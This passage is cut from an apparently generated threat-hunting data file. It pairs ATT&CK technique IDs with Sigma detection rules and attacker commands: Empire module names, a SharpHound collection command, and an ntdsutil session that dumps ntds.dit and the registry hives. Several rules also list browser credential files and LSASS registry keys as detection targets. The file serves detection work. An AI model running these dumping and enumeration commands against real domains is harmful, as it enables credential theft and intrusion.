{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: CVE-2020-0688 Exploitation IIS Eventlog\nid: d6266bf5-935e-4661-b477-78772735a7cb\nstatus: experimental\ndescription: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nreferences:\n\u00a0\u00a0\u00a0\u00a0- https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/\nauthor: Florian Roth\ndate: 2020/02/29\ntags:\n\u00a0\u00a0\u00a0\u00a0- attack.initial_access\n\u00a0\u00a0\u00a0\u00a0- attack.t1190\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: IIS\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cs-method: 'POST'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c-uri | contains: '/owa/auth.owa'\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cs-method: 'GET'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c-uri | contains: '__VIEWSTATEGENERATOR = * __VIEWSTATE ='\n\u00a0\u00a0\u00a0\u00a0timeframe: 3s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: selection1 and selection2\nfalsepositives:\n\u00a0\u00a0\u00a0\u00a0- Unknown\nlevel: high", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Oracle WebLogic Exploit", "id": "37e8369b-43bb-4bf8-83b6-6dd43bda2000", "description": "Detects access to a webshell droped into a keytore folder on the WebLogic server", "author": "Florian Roth", "date": "2018/07/22", "status": "experimental", "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-2894", "https://twitter.com/pyn3rd/status/1020620932967223296", "https://github.com/LandGrey/CVE-2018-2894"], "logsource": {"category": "webserver"}, "detection": {"selection": {"c-uri-path": ["*/config/keystore/*.js*"]}, "condition": "selection"}, "fields": ["c-ip", "c-dns"], "falsepositives": ["Unknown"], "tags": ["attack.t1100", "attack.t1190", "attack.initial_access", "attack.persistence", "attack.privilege_escalation", "cve.2018-2894"], "level": "critical"}}, {"data_source": {"title": "Potential RDP exploit CVE-2019-0708", "id": "aaa5b30d-f418-420b-83a0-299cb6024885", "description": "Detect suspicious error on protocol RDP, potential CVE-2019-0708", "references": ["https://github.com/zerosum0x0/CVE-2019-0708", "https://github.com/Ekultek/BlueKeep"], "tags": ["attack.initial_access", "attack.lateral_movement", "attack.t1210", "attack.t1190", "car.2013-07-002"], "status": "experimental", "author": "Lionel PRAT, Christophe BROCAS, @atc_project (improvements)", "logsource": {"product": "windows", "service": "system"}, "detection": {"selection": {"EventID": [56, 50], "Source": "TermDD"}, "condition": "selection"}, "falsepositives": ["Bad connections or network interruptions"], "level": "high"}}]}, {"technique_id": "T1008", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/switch_listener", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/switch_listener", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "external/generate_agent", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "external/generate_agent", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/switch_listener", "ATT&CK Technique #1": "T1008", "ATT&CK Technique #2": "", "Technique": "Fallback Channels", "Concatenate for Python Dictionary": "\"powershell/management/switch_listener\":  [\"T1008\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "external/generate_agent", "ATT&CK Technique #1": "T1008", "ATT&CK Technique #2": "", "Technique": "Fallback Channels", "Concatenate for Python Dictionary": "\"external/generate_agent\":  [\"T1008\"],"}}], "command_list": ["powershell/management/switch_listener", "powershell/management/switch_listener", "external/generate_agent", "external/generate_agent"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1178", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/add_sid_history", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/add_sid_history", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/misc/add_sid_history", "ATT&CK Technique #1": "T1178", "ATT&CK Technique #2": "", "Technique": "SID-History Injection", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/add_sid_history\":  [\"T1178\"],"}}], "command_list": ["powershell/persistence/misc/add_sid_history", "powershell/persistence/misc/add_sid_history"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: Windows SID History permission to create a domain controller back door\ndescription: domain environment test\nreferences: https://adsecurity.org/?p=1772\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0--4766 # attempt to add SID History to an account failed.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0--4765 # SID history has been added to the account.\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Addition of SID History to Active Directory Object", "id": "2632954e-db1c-49cb-9936-67d1ef1d17d2", "status": "stable", "description": "An attacker can use the SID history attribute to gain additional privileges.", "references": ["https://adsecurity.org/?p=1772"], "author": "Thomas Patzke, @atc_project (improvements)", "tags": ["attack.persistence", "attack.privilege_escalation", "attack.t1178"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection1": {"EventID": [4765, 4766]}, "selection2": {"EventID": 4738}, "selection3": {"SidHistory": ["-", "%%1793"]}, "condition": "selection1 or (selection2 and not selection3)"}, "falsepositives": ["Migration of an account into a new domain"], "level": "medium"}}]}, {"technique_id": "T1213", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/findtrusteddocuments", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/findtrusteddocuments", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/findtrusteddocuments", "ATT&CK Technique #1": "T1213", "ATT&CK Technique #2": "", "Technique": "Data from Information Repositories", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/findtrusteddocuments\":  [\"T1213\"],"}}], "command_list": ["powershell/situational_awareness/host/findtrusteddocuments", "powershell/situational_awareness/host/findtrusteddocuments"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1157", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/CreateHijacker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/CreateHijacker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/osx/HijackScanner", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/osx/HijackScanner", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/persistence/osx/CreateHijacker", "ATT&CK Technique #1": "T1157", "ATT&CK Technique #2": "", "Technique": "Dylib Hijacking", "Concatenate for Python Dictionary": "\"python/persistence/osx/CreateHijacker\":  [\"T1157\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/host/osx/HijackScanner", "ATT&CK Technique #1": "T1157", "ATT&CK Technique #2": "", "Technique": "Dylib Hijacking", "Concatenate for Python Dictionary": "\"python/situational_awareness/host/osx/HijackScanner\":  [\"T1157\"],"}}], "command_list": ["python/persistence/osx/CreateHijacker", "python/persistence/osx/CreateHijacker", "python/situational_awareness/host/osx/HijackScanner", "python/situational_awareness/host/osx/HijackScanner"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1049 / 1069", "commands": [{"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nSharpHound.exe -c ALL", "name": "Dos"}], "parsed_datasets": [], "command_list": ["Dos\nSharpHound.exe -c ALL"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: win-bloodhound use\ndescription: windows server 2012\nreferences:\ntags: T1049 / 1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5145 # checked whether the network shared objects can grant access needed by clients.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: 'File' # network information> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: '*' # Network Information> Source Address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0sourceport: '*' # network information> source port\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ShareName: '\\\\ * \\ IPC $' # Share Information> Share Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Relativetargetname: # share information> relative to the target name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- NETLOGON\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- lsarpc\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- samr\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- srvsvc\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- winreg\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- wkssvc\n\u00a0\u00a0\u00a0\u00a0timeframe: last 30s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1069 AD privileged group / user enumeration", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: AD domain authority and the user group enumeration\ndescription: win7 test, windows service 2008 (the domain controller)\nreferences: http://www.polaris-lab.com/index.php/archives/42/\ntags: T1087 / T1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4661 # has been requested to handle objects\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: # Object> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- SAM_USER\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- SAM_GROUP\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectname: # Object> object name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 502'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 512'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 500'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 505'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 519'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 520'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 544'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 551'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'S-1-5-21 - * - * - * - 555'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: 'C: \\ Windows \\ System32 \\ lsass.exe' # process information> Process Name\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1069 / 1087", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: detection of a local user group enumeration behavior\ndescription: windows server 2016\nreferences:\ntags: T1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0--4798 # of enumeration local group membership of users. Test command: net user\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0--4799 # enumeration has enabled local group membership security mechanisms. Test command: net localgroup administrators\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: 'C: \\ Windows \\ System32 \\ net1.exe' # Process information: Process Name\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: local attacker to collect information, and execute the whoami command net user command\ndescription: windows server 2012\nstatus: experimental\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: '* \\ whoami.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: whoami # process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: '* \\ net.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net user # process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: '* \\ net1.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: '* \\ net1 user' # command-line process\n\u00a0\u00a0\u00a0\u00a0condition: selection1 or (selection2 and selection3)\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1003 windows", "commands": [{"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32 \\ ntdsutil.exe: ac i ntds\nExamples of activities set to \"ntds\".\nC: \\ Windows \\ system32 \\ ntdsutil.exe: ifm\nifm: create full c: \\ temp\nCreating a snapshot ...\nSuccessfully generated snapshot set {ea08df62-9743-4068-aedb-a2c32dfd057f}.\nSnapshot {2d92b366-961f-45f0-9202-9aa6f069139f} has as C: \\ $ SNAP_201911011107_VOLUMEC $ \\ loading\nLoaded snapshots {2d92b366-961f-45f0-9202-9aa6f069139f}.\nStarting Defragmentation Mode ...\nSource database: C: \\ $ SNAP_201911011107_VOLUMEC $ \\ Windows \\ NTDS \\ ntds.dit\nTarget database: c: \\ temp \\ Active Directory \\ ntds.dit\n\nDefragmentation Status (% complete)\n\n0,102,030,405,060,708,090 100\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n.................................................. .\n\nRegistry files are being copied ...\nWe are copied c: \\ temp \\ registry \\ SYSTEM\nWe are copied c: \\ temp \\ registry \\ SECURITY\nSnapshot {2d92b366-961f-45f0-9202-9aa6f069139f} uninstalled.\nIn the c: \\ temp successfully created IFM media.\nifm: q\nC: \\ Windows \\ system32 \\ ntdsutil.exe: q", "name": "Dos"}], "parsed_datasets": [], "command_list": ["Dos\nC: \\ Windows \\ system32 \\ ntdsutil.exe: ac i ntds\nExamples of activities set to \"ntds\".\nC: \\ Windows \\ system32 \\ ntdsutil.exe: ifm\nifm: create full c: \\ temp\nCreating a snapshot ...\nSuccessfully generated snapshot set {ea08df62-9743-4068-aedb-a2c32dfd057f}.\nSnapshot {2d92b366-961f-45f0-9202-9aa6f069139f} has as C: \\ $ SNAP_201911011107_VOLUMEC $ \\ loading\nLoaded snapshots {2d92b366-961f-45f0-9202-9aa6f069139f}.\nStarting Defragmentation Mode ...\nSource database: C: \\ $ SNAP_201911011107_VOLUMEC $ \\ Windows \\ NTDS \\ ntds.dit\nTarget database: c: \\ temp \\ Active Directory \\ ntds.dit\n\nDefragmentation Status (% complete)\n\n0,102,030,405,060,708,090 100\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n.................................................. .\n\nRegistry files are being copied ...\nWe are copied c: \\ temp \\ registry \\ SYSTEM\nWe are copied c: \\ temp \\ registry \\ SECURITY\nSnapshot {2d92b366-961f-45f0-9202-9aa6f069139f} uninstalled.\nIn the c: \\ temp successfully created IFM media.\nifm: q\nC: \\ Windows \\ system32 \\ ntdsutil.exe: q"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1503", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system web browser to obtain the voucher\ndescription: windows server 2016 test results\nreferences: No\ntags: T1503\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4663 # trying to access the object.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectserver: Security # Object> Object Server\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: file # Object> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectname:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'C: \\ users \\ * \\ appdata \\ roaming \\ opera software \\ opera stable \\ login data' # Object> object name Opera\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'C: \\ Users \\ IEUser \\ AppData \\ Roaming \\ Mozilla \\ Firefox \\ Profiles \\ kushu3sd.default \\ key4.db' #Firefox\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'C: \\ Users \\ IEUser \\ AppData \\ Roaming \\ Mozilla \\ Firefox \\ Profiles \\ kushu3sd.default \\ logins.json' #Firefox\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'C: \\ Users \\ IEUser \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Login Data' #Chrome\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Access: ReadData (or listdirectory) # access request information> Access\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1078", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Admin User Remote Logon", "id": "0f63e1ef-1eb9-4226-9d54-8927ca08520a", "description": "Detect remote login by Administrator user depending on internal pattern", "references": ["https://car.mitre.org/wiki/CAR-2016-04-005"], "tags": ["attack.lateral_movement", "attack.t1078", "car.2016-04-005"], "status": "experimental", "author": "juju4", "logsource": {"product": "windows", "service": "security", "definition": "Requirements: Identifiable administrators usernames (pattern or special unique character. ex: \"Admin-*\"), internal policy mandating use only as secondary account"}, "detection": {"selection": {"EventID": 4624, "LogonType": 10, "AuthenticationPackageName": "Negotiate", "AccountName": "Admin-*"}, "condition": "selection"}, "falsepositives": ["Legitimate administrative activity"], "level": "low"}}, {"data_source": {"title": "Enabled User Right in AD to Control User Objects", "id": "311b6ce2-7890-4383-a8c2-663a9f6b43cd", "description": "Detects scenario where if a user is assigned the SeEnableDelegationPrivilege right in Active Directory it would allow control of other AD user objects.", "tags": ["attack.privilege_escalation", "attack.t1078"], "references": ["https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/"], "author": "@neu5ron", "logsource": {"product": "windows", "service": "security", "definition": "Requirements: Audit Policy : Policy Change > Audit Authorization Policy Change, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy Change"}, "detection": {"selection": {"EventID": 4704}, "keywords": {"Message": ["*SeEnableDelegationPrivilege*"]}, "condition": "all of them"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Account Tampering - Suspicious Failed Logon Reasons", "id": "9eb99343-d336-4020-a3cd-67f3819e68ee", "description": "This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow restricted.", "author": "Florian Roth", "modified": "2019/03/01", "references": ["https://twitter.com/SBousseaden/status/1101431884540710913"], "tags": ["attack.persistence", "attack.privilege_escalation", "attack.t1078"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": [4625, 4776], "Status": ["0xC0000072", "0xC000006F", "0xC0000070", "0xC0000413", "0xC000018C", "0xC000015B"]}, "condition": "selection"}, "falsepositives": ["User using a disabled account"], "level": "high"}}, {"data_source": {"title": "Multiple Failed Logins with Different Accounts from Single Source System", "id": "e98374a6-e2d9-4076-9b5c-11bdb2569995", "description": "Detects suspicious failed logins with different user accounts from a single source system", "author": "Florian Roth", "tags": ["attack.persistence", "attack.privilege_escalation", "attack.t1078"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection1": {"EventID": [529, 4625], "UserName": "*", "WorkstationName": "*"}, "selection2": {"EventID": 4776, "UserName": "*", "Workstation": "*"}, "timeframe": "24h", "condition": ["selection1 | count(UserName) by WorkstationName > 3", "selection2 | count(UserName) by Workstation > 3"]}, "falsepositives": ["Terminal servers", "Jump servers", "Other multiuser systems like Citrix server farms", "Workstations with frequently changing users"], "level": "medium"}}, {"data_source": {"title": "Interactive Logon to Server Systems", "id": "3ff152b2-1388-4984-9cd9-a323323fdadf", "description": "Detects interactive console logons to", "author": "Florian Roth", "tags": ["attack.lateral_movement", "attack.t1078"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": [528, 529, 4624, 4625], "LogonType": 2, "ComputerName": ["%ServerSystems%", "%DomainControllers%"]}, "filter": {"LogonProcessName": "Advapi", "ComputerName": "%Workstations%"}, "condition": "selection and not filter"}, "falsepositives": ["Administrative activity via KVM or ILO board"], "level": "medium"}}, {"data_source": {"title": "User Added to Local Administrators", "id": "c265cf08-3f99-46c1-8d59-328247057d57", "description": "This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity", "status": "stable", "author": "Florian Roth", "tags": ["attack.privilege_escalation", "attack.t1078"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4732}, "selection_group1": {"GroupName": "Administrators"}, "selection_group2": {"GroupSid": "S-1-5-32-544"}, "filter": {"SubjectUserName": "*$"}, "condition": "selection and (1 of selection_group*) and not filter"}, "falsepositives": ["Legitimate administrative activity"], "level": "medium"}}]}, {"technique_id": "T1133", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1011", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Security Support Provider (SSP) added to LSA configuration", "id": "eeb30123-9fbd-4ee8-aaa0-2e545bbed6dc", "status": "experimental", "description": "Detects the addition of a SSP to the registry. Upon a reboot or API call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows.", "references": ["https://attack.mitre.org/techniques/T1101/", "https://powersploit.readthedocs.io/en/latest/Persistence/Install-SSP/"], "tags": ["attack.persistence", "attack.t1011"], "author": "iwillkeepwatch", "date": "2019/01/18", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection_registry": {"EventID": 13, "TargetObject": ["HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages", "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages"]}, "exclusion_images": [{"Image": "C:\\Windows\\system32\\msiexec.exe"}, {"Image": "C:\\Windows\\syswow64\\MsiExec.exe"}], "condition": "selection_registry and not exclusion_images"}, "falsepositives": ["Unlikely"], "level": "critical"}}]}, {"technique_id": "T1177", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "DLL Load via LSASS", "id": "b3503044-60ce-4bf4-bbcb-e3db98788823", "status": "experimental", "description": "Detects a method to load DLL via LSASS process using an undocumented Registry key", "author": "Florian Roth", "date": "2019/10/16", "references": ["https://blog.xpnsec.com/exploring-mimikatz-part-1/", "https://twitter.com/SBousseaden/status/1183745981189427200"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": [12, 13], "TargetObject": ["*\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt*", "*\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt*"]}, "condition": "selection"}, "tags": ["attack.execution", "attack.t1177"], "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1211", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Droppers exploiting CVE-2017-11882", "id": "678eb5f4-8597-4be6-8be7-905e4234b53a", "status": "experimental", "description": "Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe", "references": ["https://www.hybrid-analysis.com/sample/2a4ae284c76f868fc51d3bb65da8caa6efacb707f265b25c30f34250b76b7507?environmentId=100", "https://www.google.com/url?hl=en&q=https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about&source=gmail&ust=1511481120837000&usg=AFQjCNGdL7gVwLXaNSl2Td8ylDYbSJFmPw"], "author": "Florian Roth", "date": "2017/11/23", "tags": ["attack.defense_evasion", "attack.t1211"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\EQNEDT32.EXE"}, "condition": "selection"}, "fields": ["CommandLine"], "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"title": "Microsoft Malware Protection Engine Crash", "id": "6c82cf5c-090d-4d57-9188-533577631108", "description": "This rule detects a suspicious crash of the Microsoft Malware Protection Engine", "tags": ["attack.defense_evasion", "attack.t1089", "attack.t1211"], "status": "experimental", "date": "2017/05/09", "references": ["https://bugs.chromium.org/p/project-zero/issues/detail?id=1252&desc=5", "https://technet.microsoft.com/en-us/library/security/4022344"], "author": "Florian Roth", "logsource": {"product": "windows", "service": "application"}, 